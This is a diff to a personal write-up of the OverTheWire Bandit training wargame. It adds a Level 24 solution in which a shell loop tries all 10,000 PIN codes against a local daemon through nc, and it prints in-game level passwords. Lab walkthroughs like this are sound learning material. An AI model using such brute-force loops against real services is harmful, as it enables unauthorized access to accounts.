@@ -33,8 +33,11 @@ Checked a writeup and saw that the format should have been bandit14@localhost
 4. ssh -i sshkey.private bandit14@localhost
 
 Successfully logged into bandit14. 
+
 5. cd .. : to change directory to home directory
+
 6. cd /etc/bandit_pass
+
 7. cat bandit14
 
 Password successfully obtained!
@@ -277,5 +280,41 @@ The script should be executed within 60 seconds. Once executed, the password wil
 **LEVEL 24 -> LEVEL 25**
 
 Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Goal: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+1. Syntax for a loop statement
+*for VARIABLE in 1 2 3 .. N*
+*do*
+  commands
+*done*
+
+Reference: (https://www.cyberciti.biz/faq/bash-for-loop/#Syntax)
+First, I'll try a sample program
+
+To print N numbers, use *for var in $(seq N)*
+
+Reference: (https://linuxhint.com/bash_range/)
+
+2. Login 
+3. Creating a directory in /tmp
+*mkdir /tmp/ziya*
+*cd /tmp/ziya*
+4. Writing the shell script 
+*vim script.sh*
+**Script** 
+#!/bin/sh
+for i in $(seq 0 9999)
+do
+   echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done 
+
+5. Connecting to port 30002
+*bash script.sh | nc localhost 30002*
+Gave multiple messages saying the pincode is wrong and finally got the password for user bandit25!
+
+**LEVEL 25 -> LEVEL 26**
+
+Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 
 
